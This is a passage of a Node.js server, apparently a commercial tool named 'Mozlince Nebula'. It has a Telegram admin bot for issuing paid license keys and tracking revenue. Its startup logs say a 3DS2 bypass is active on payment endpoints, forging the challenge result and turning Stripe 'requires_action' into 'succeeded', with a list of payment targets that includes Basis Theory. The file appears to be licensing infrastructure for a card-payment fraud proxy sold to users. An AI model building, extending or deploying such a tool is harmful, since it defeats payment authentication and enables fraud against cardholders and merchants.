  sep: '╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌',
};

function menuPrincipal(lang='pt') {
  const hora = new Date().toLocaleString('pt-BR', { timeZone:'America/Sao_Paulo', hour:'2-digit', minute:'2-digit' });
  return {
    texto: `${UI.header(lang)}\n\n<b>⌬  PAINEL DE CONTROLE</b>\n<code>${UI.sep}</code>\n<b>◔</b> ${hora}   <b>◉</b> online   <b>⟡</b> seguro ES256\n<code>${UI.sep}</code>\n\n<i>Selecione uma operação abaixo</i>`,
    teclado: { inline_keyboard: [
      [{ text: '⚡  Gerar Licença', callback_data:'m_gerar' }],
      [{ text: '◈  Minhas Chaves', callback_data:'m_listar' }, { text: '◧  Estatísticas', callback_data:'m_stats' }],
      [{ text: '⟡  Vincular', callback_data:'m_vincular' }, { text: '⌬  Desvincular', callback_data:'m_desvincular' }],
      [{ text: '◉  Consultar', callback_data:'m_consultar' }],
      [{ text: '✦  Tabela de Preços', callback_data:'m_precos' }],
      [{ text: '✉  Enviar Mensagem', callback_data:'m_dm' }, { text: '💬  Conversas', callback_data:'m_convs' }],
      [{ text: '✆  Suporte', callback_data:'m_contacto' }],
      [{ text: '◐  Idioma / Language', callback_data:'m_lang' }],
      [{ text: '?  Ajuda', callback_data:'m_ajuda' }, { text: '⚠  Zona de Perigo', callback_data:'m_perigo' }]
    ]}
  };
}
async function cmdStart(chatId, msgId=null) { const m = menuPrincipal('pt'); if (msgId) await tgEdit(chatId, msgId, m.texto, m.teclado); else await tgSend(chatId, m.texto, m.teclado); }

app.post('/telegram-webhook', async (req, res) => {
  res.sendStatus(200);
  const update = req.body || {};
  try {
    if (update.callback_query) {
      const cb = update.callback_query, chatId = cb.message.chat.id, msgId = cb.message.message_id, data = cb.data;
      const isOwner = OWNER_ID && String(cb.from.id) === String(OWNER_ID);
      await tgAnswer(cb.id);
      if (!isOwner) return;
      if (data === 'm_home') return cmdStart(chatId, msgId);
      if (data === 'm_gerar') {
        const kb = { inline_keyboard: [] };
        const entries = Object.entries(PACOTES);
        for (let i = 0; i < entries.length; i += 2) {
          const linha = [{ text: `${entries[i][1].emoji} ${entries[i][1].nome} · ${precoFmt(entries[i][1].preco)}`, callback_data:`g_${entries[i][0]}` }];
          if (entries[i+1]) linha.push({ text: `${entries[i+1][1].emoji} ${entries[i+1][1].nome} · ${precoFmt(entries[i+1][1].preco)}`, callback_data:`g_${entries[i+1][0]}` });
          kb.inline_keyboard.push(linha);
        }
        kb.inline_keyboard.push([{ text: '‹  Voltar', callback_data:'m_home' }]);
        return tgEdit(chatId, msgId, `${UI.header()}\n\n<b>⚡  Gerar Licença</b>\n<code>${UI.sep}</code>\n<i>Escolha um plano abaixo:</i>`, kb);
      }
      if (data.startsWith('g_')) {
        const pk = data.substring(2), p = PACOTES[pk];
        if (!p) return;
        const chave = generateLicenseKey();
        const agora = Date.now();
        const expira = p.lifetime ? (agora + 100*365*24*60*60*1000) : (agora + p.dias*24*60*60*1000);
        await redisSet(chave, { chave, plano: pk, planoNome: p.nome, preco: p.preco, dias: p.dias, lifetime: p.lifetime === true, criadaEm: agora, expiraEm: expira, ativa: true, v: 8 });
        return tgEdit(chatId, msgId, `${UI.header()}\n\n<b>✓  LICENÇA EMITIDA</b>\n<code>${UI.sep}</code>\n\n<b>Chave:</b>\n<code>${chave}</code>\n\n<b>Plano:</b> ${p.nome}\n<b>Preço:</b> ${precoFmt(p.preco)}\n<b>Expira:</b> ${p.lifetime ? 'Nunca' : formatDate(expira)}`, { inline_keyboard: [[{ text: '‹  Menu', callback_data:'m_home' }]] });
      }
      if (data === 'm_stats') {
        const keys = (await redisScan('ASHEO-*')).filter(k => !k.startsWith('ASHEO-INSTALL-') && !k.startsWith('ASHEO-USER') && !k.startsWith('ASHEO-CONV-') && !k.startsWith('ASHEO-CAMPAIGN'));
        let ativas=0, exp=0, vinc=0, receita=0;
        for (const k of keys) { const l = await redisGet(k).catch(()=>null); if (!l) continue; if (l.ativa) ativas++; if (!l.lifetime && l.expiraEm < Date.now()) exp++; if (l.installId) vinc++; if (l.preco) receita += Number(l.preco) || 0; }
        return tgEdit(chatId, msgId, `${UI.header()}\n\n<b>◧  Estatísticas</b>\n<code>${UI.sep}</code>\n\n<b>◈ Total:</b> <code>${keys.length}</code>\n<b>● Ativas:</b> <code>${ativas}</code>\n<b>○ Expiradas:</b> <code>${exp}</code>\n<b>⟡ Vinculadas:</b> <code>${vinc}</code>\n\n<code>${UI.sep}</code>\n<b>◆ Receita:</b> <code>${precoFmt(receita)}</code>`, { inline_keyboard: [[{ text: '‹  Menu', callback_data:'m_home' }]] });
      }
      return cmdStart(chatId, msgId);
    }
    if (update.message && update.message.text) {
      const chatId = update.message.chat.id, text = String(update.message.text).trim();
      const isOwner = OWNER_ID && String(update.from.id) === String(OWNER_ID);
      if (isOwner && (text === '/start' || text === '/menu')) return cmdStart(chatId);
    }
  } catch (e) {}
});

/* ═══ 404 ═══ */
app.use((req,res)=>{ res.status(404).json({ok:false,error:'not_found',path:req.path}); });

/* ═══ START ═══ */
const PORT = process.env.PORT || 3000;
const server = app.listen(PORT, () => {
  banner();
  log('SYS', `Mozlince Nebula v8.6.0 Quantum++ na porta ${PORT}`);
  log('SYS', `Server URL: ${SERVER_URL}`);
  log('SYS', `Chave: ${ORIGEM}`);
  if (!PRIVATE_KEY) log('ERRO', 'SEM CHAVE PRIVADA — /v1/activate vai falhar 500');
  log('SYS', `Redis: ${UPSTASH_URL && UPSTASH_TOKEN ? 'OK' : 'FALTA (defina UPSTASH_REDIS_REST_URL/TOKEN)'}`);
  log('SYS', `Telegram: ${TELEGRAM_TOKEN ? 'OK' : 'FALTA (defina TELEGRAM_TOKEN)'}`);
  log('SYS', `OWNER_ID: ${OWNER_ID ? 'OK' : 'FALTA — bot não terá admin'}`);
  log('SYS', `Webhook secret: ${TELEGRAM_WEBHOOK_SECRET ? 'ATIVO' : 'ausente (recomendado setar)'}`);
  log('SYS', `Planos: ${Object.keys(PACOTES).length} (USD)`);
  log('RULES', `Payment Rules: ${PAYMENT_RULES.length} (v${RULES_VERSION})`);
  log('OK', `✔ Express 4 Routes (* em vez de *splat)`);
  log('DS2', `✔ 3DS2 bypass ativo em /payments/details (forge challengeResult)`);
  log('DS2', `✔ Stripe 3DS2 forge (requires_action → succeeded)`);
  log('OK', `✔ EXCLUSIVE_TARGETS: ${EXCLUSIVE_TARGETS.length} entries (inclui /payments/details, Stripe 3DS2, Basis Theory)`);
  log('OK', `✔ Proxy exige Auth (Bearer / Asheo-Pass / gwPass)`);
  log('OK', `✔ Timeout de 15s no Upstream (AbortController)`);
});
server.setTimeout(30000);
server.keepAliveTimeout = 65000;
server.headersTimeout = 66000;

process.on('uncaughtException', e => { log('ERRO', 'Uncaught: ' + (e && e.stack || e)); process.exit(1); });
process.on('unhandledRejection', e => { log('ERRO', 'Rejection: ' + (e && e.stack || e)); });
process.on('SIGTERM', () => { log('SYS','SIGTERM — encerrando'); process.exit(0); });
process.on('SIGINT', () => { log('SYS','SIGINT — encerrando'); process.exit(0); });
